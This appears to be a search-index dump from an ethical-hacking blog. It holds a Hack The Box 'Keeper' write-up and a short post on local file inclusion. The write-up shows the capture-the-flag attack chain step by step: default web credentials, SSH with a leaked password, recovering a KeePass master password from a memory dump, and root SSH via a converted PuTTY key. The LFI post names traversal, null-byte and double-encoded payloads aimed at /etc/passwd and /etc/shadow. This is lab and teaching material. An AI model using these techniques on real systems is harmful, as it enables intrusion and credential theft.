
[{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/authors/jose/","section":"Authors","summary":"","title":"Jose","type":"authors"},{"content":"Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’. Using SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.\nInitial Recon # Verficamos nuestra conexion con la maquina, en caso de que no te responda, Verfica tu archivo VPN:\n❯ ping -c 1 10.10.11.227 PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data. 64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms --- 10.10.11.227 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Let\u0026rsquo;s perform a more in-depth scan:\nnmap -sVC -p22,80 10.10.11.227 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ports Info # Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let\u0026rsquo;s look at the website.\nWeb # Default Credentials In Tracker # When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.\nWhen looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.\nSecondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!\nSSH Credentials # ssh lnorgaard@keeper.htb Privilege Escalation # The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.\n\u0026gt; unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx We get the crash dump for KeePass and a KeePass database file.\nExtracting the KeePass master password # It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey\n\u0026gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp 2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp Possible password: ●,dgr●d med fl●de There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.\nI will use the kpcli utility to interact with the KeePass database file that we have looted.\n\u0026gt; kpcli KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #Rødgrød med fløde Error opening file: Couldn\u0026#39;t load the file passcodes.kdbx Error(s) from File::KeePass: The database key appears invalid or else the database is corrupt. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #rødgrød med fløde kpcli:/\u0026gt; ls === Groups === passcodes/ Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.\nSSH Private Key for root # kpcli:/\u0026gt; ls * === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/\u0026gt; ls */* /passcodes/eMail: /passcodes/General: /passcodes/Homebanking: /passcodes/Internet: /passcodes/Network: === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System /passcodes/Recycle Bin: === Entries === 2. Sample Entry keepass.info 3. Sample Entry #2 keepass.info/help/kb/testform. /passcodes/Windows: kpcli:/\u0026gt; cd /passcodes/Network kpcli:/passcodes/Network\u0026gt; ls === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System kpcli:/passcodes/Network\u0026gt; show -f 0 Title: keeper.htb (Ticketing Server) Uname: root Pass: \u0026lt;REDACTED\u0026gt; URL: Notes: PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D \u0026lt;REDACTED\u0026gt; It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:\nputtygen key.putty -O private-openssh -o id_rsa And use the key to SSH:\n\u0026gt; ssh root@keeper.htb -i id_rsa \u0026gt; id uid=0(root) gid=0(root) groups=0(root) ","date":"26 January 2023","externalUrl":null,"permalink":"/writeups/keeper/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Keeper Writeup","type":"writeups"},{"content":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed. In this guide, we\u0026rsquo;ll delve into the advanced aspects of LFI and Path Traversal, exploring real-world examples and learning how to effectively mitigate these risks.\nUnderstanding Local File Inclusion (LFI) and Path Traversal: # Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files from the server\u0026rsquo;s file system. Path Traversal, on the other hand, involves manipulating file paths to access files outside the web root directory. These vulnerabilities can be exploited to disclose sensitive information, execute arbitrary code, or even compromise the entire system.\nExploring Advanced LFI and Path Traversal Techniques: # Directory Traversal Attack: In this scenario, the attacker manipulates input parameters to traverse directories and access files outside the web root directory. For example, by appending \u0026ldquo;../\u0026rdquo; to a file path, the attacker can navigate to parent directories and access sensitive files.\nNull Byte Injection: Null byte injection exploits the use of null terminators in file paths to bypass security measures. By appending a null byte (%00) to the end of a file path, the attacker can truncate the path and access files that would otherwise be restricted.\nDouble Encoding: Double encoding involves encoding special characters multiple times to bypass input validation mechanisms. For instance, the attacker may encode \u0026ldquo;../\u0026rdquo; as \u0026ldquo;%252e%252e%252f\u0026rdquo; to bypass filters and execute a directory traversal attack.\nReal-World Examples: # Consider a web application vulnerable to LFI and Path Traversal. The attacker could exploit these vulnerabilities to access sensitive configuration files, such as \u0026ldquo;/etc/passwd\u0026rdquo; or \u0026ldquo;/etc/shadow\u0026rdquo;, leading to unauthorized access to user credentials.\nMitigating LFI and Path Traversal: # To mitigate LFI and Path Traversal vulnerabilities, it\u0026rsquo;s essential to implement robust input validation and access controls:\nSanitize user input to prevent directory traversal attacks. Implement proper file path validation to restrict access to authorized directories. Use secure coding practices, such as parameterized queries and output encoding, to prevent injection attacks. Regularly update and patch web servers and applications to address known vulnerabilities. ##Conclusion: Local File Inclusion (LFI) and Path Traversal are serious security risks that require careful attention and mitigation strategies. By understanding the advanced techniques used by attackers and implementing effective security measures, organizations can protect their web applications and prevent unauthorized access to sensitive data. Stay vigilant, stay informed, and stay secure in the ever-evolving landscape of web security.\n","date":"26 January 2023","externalUrl":null,"permalink":"/posts/lfi/","section":"Post","summary":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed.","title":"Local File Inclusion","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/posts/","section":"Post","summary":"","title":"Post","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/","section":"Rift Hacking","summary":"","title":"Rift Hacking","type":"page"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/writeups/","section":"Tags","summary":"","title":"Writeups","type":"tags"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/writeups/","section":"WriteUps","summary":"","title":"WriteUps","type":"writeups"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/team/","section":"Rift Hacking","summary":"","title":"","type":"page"},{"content":" About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking. Our mission is to provide accessible and educational resources for those interested in learning how to protect systems and data in an ethical and responsible manner.\nOur Vision # We strive to create an online community where cybersecurity enthusiasts can explore, learn, and practice ethical hacking skills. We believe in an educational approach that fosters integrity, ethics, and responsibility in the digital world.\nWhat We Offer # At Rift Hacking, you will find a variety of resources, from hands-on tutorials to informative articles and ethical hacking challenges. Our goal is to empower individuals of all skill levels to contribute to online security in a positive way.\nAbout the Founder # Hello! I\u0026rsquo;m Jose Milane, the founder of Rift Hacking, a passionate cybersecurity enthusiast aged 20. My aim is to share the knowledge I acquire.\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Rift Hacking","summary":"About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking.","title":"About","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]